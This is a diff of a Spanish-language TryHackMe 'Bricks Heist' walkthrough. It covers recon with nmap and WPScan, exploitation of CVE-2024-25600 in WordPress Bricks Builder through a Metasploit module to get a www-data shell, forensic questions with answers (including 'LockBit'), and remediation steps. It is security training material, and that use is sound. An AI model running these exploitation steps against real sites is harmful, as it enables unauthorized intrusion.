@@ -1,6 +1,25 @@
-# Walkthrough Técnico - Bricks Heist
+# 🛠️ Walkthrough Técnico - Bricks Heist
 
-## Fase 0: Configuración inicial
+| Información | Detalle |
+|-------------|---------|
+| **Autor** | Javier |
+| **Fecha** | 10/03/2026 |
+| **Plataforma** | TryHackMe |
+| **Dificultad** | Principiante/Intermedio |
+| **Tiempo Estimado** | 2 horas |
+
+---
+
+## 📋 Índice
+
+1. [Fase 0: Configuración Inicial](#fase-0-configuración-inicial)
+2. [Fase 1: Reconocimiento](#fase-1-reconocimiento)
+3. [Fase 2: Explotación](#fase-2-explotación)
+4. [Fase 3: Post-Explotación y Forense](#fase-3-post-explotación-y-forense)
+5. [Fase 4: Remediación](#fase-4-remediación)
+6. [Herramientas Utilizadas](#herramientas-utilizadas)
+
+## Fase 0: Configuración inicial 🔧
 1. Configurar el Host
 # Editar archivo de hosts
 sudo nano /etc/hosts
@@ -11,7 +30,7 @@ sudo nano /etc/hosts
 ping -c 3 bricks.thm
 # Esperar respuesta del servidor
 
-## Fase 1: Reconocimiento (Recon)
+## Fase 1: Reconocimiento (Recon) 🔍
 3.Escaneo de Puertos con Nmap
 nmap -sC -sV -oN escaneo_inicial.txt bricks.thm
 -Resultado clave: Puerto 443 (HTTPS) abierto → WordPress detectado
@@ -26,7 +45,7 @@ Version: 1.9.5 (80% confidence)
 # Buscar CVE para Bricks Builder 1.9.5
 Resultado: CVE-2024-25600 - RCE no autenticada (CVSS 9.8)
 
-## Fase 2: Explotación
+## Fase 2: Explotación 💣
 6.Ejecutar Exploit (Metasploit)
 msfconsole
 search wp_bricks_builder_rce
@@ -50,7 +69,7 @@ id
 pwd
 -Confirmación: Shell obtenida como usuario www-data
 
-## Fase 3: Post-Explotación y Forense
+## Fase 3: Post-Explotación y Forense 🔍
 8.Buscar Archivo .txt Oculto (Pregunta 1)
 # En Meterpreter:
 ls -la /var/www/html/
@@ -115,7 +134,7 @@ echo "5757314e..." | xxd -r -p | base64 -d
 
 ✅ RESPUESTA 6: LockBit
 
-## Fase 4: Remediación (Bonus)
+## Fase 4: Remediación (Bonus) 🔐
 14.Contención Inmediata
 # Detener servicio malicioso
 systemctl stop ubuntu.service
@@ -149,3 +168,9 @@ chown www-data:www-data /data/www/default/wp-config.php
 # Configurar monitoreo de integridad (AIDE/Tripwire)
 # Establecer alertas para procesos con alto CPU
 # Revisar logs de autenticación: /var/log/auth.log
+
+## 🔧Herramientas Utilizadas🔧
+-Nmap
+-WPScan
+-SearchSploit
+-Metasploit
